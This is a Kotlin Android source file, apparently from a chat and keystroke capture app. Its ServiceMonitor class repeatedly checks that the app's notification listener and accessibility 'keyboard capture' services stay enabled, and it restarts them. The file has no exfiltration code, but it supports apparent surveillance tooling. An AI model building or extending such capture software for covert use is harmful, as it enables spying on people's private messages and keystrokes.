package com.chats.capture.managers

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.text.TextUtils
import com.chats.capture.services.KeyboardCaptureService
import com.chats.capture.services.NotificationCaptureService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber

class ServiceMonitor(private val context: Context) {
    
    private val monitorScope = CoroutineScope(Dispatchers.Default)
    
    fun startMonitoring() {
        monitorScope.launch {
            while (true) {
                checkServices()
                delay(5 * 60 * 1000) // Check every 5 minutes
            }
        }
    }
    
    private suspend fun checkServices() {
        val notificationServiceRunning = isNotificationServiceEnabled()
        val keyboardServiceRunning = isAccessibilityServiceEnabled()
        
        Timber.d("Service status - Notification: $notificationServiceRunning, Keyboard: $keyboardServiceRunning")
        
        if (!notificationServiceRunning) {
            Timber.w("Notification service is not enabled")
        }
        
        if (!keyboardServiceRunning) {
            Timber.w("Keyboard service is not enabled")
        }
    }
    
    fun isNotificationServiceEnabled(): Boolean {
        val pkgName = context.packageName
        val flat = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        )
        if (!TextUtils.isEmpty(flat)) {
            val names = flat.split(":").toTypedArray()
            for (name in names) {
                val componentName = ComponentName.unflattenFromString(name)
                if (componentName != null) {
                    if (TextUtils.equals(pkgName, componentName.packageName)) {
                        return true
                    }
                }
            }
        }
        return false
    }
    
    fun isAccessibilityServiceEnabled(): Boolean {
        val accessibilityServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        
        if (accessibilityServices != null) {
            val colonSplitter = TextUtils.SimpleStringSplitter(':')
            colonSplitter.setString(accessibilityServices)
            while (colonSplitter.hasNext()) {
                val accessibilityService = colonSplitter.next()
                if (accessibilityService.contains(context.packageName)) {
                    return true
                }
            }
        }
        return false
    }
    
    fun restartServices() {
        try {
            // Restart notification service
            val notificationIntent = Intent(context, NotificationCaptureService::class.java)
            context.stopService(notificationIntent)
            context.startForegroundService(notificationIntent)
            
            // Restart keyboard service
            val keyboardIntent = Intent(context, KeyboardCaptureService::class.java)
            context.stopService(keyboardIntent)
            context.startForegroundService(keyboardIntent)
            
            Timber.d("Services restarted")
        } catch (e: Exception) {
            Timber.e(e, "Error restarting services")
        }
    }
}
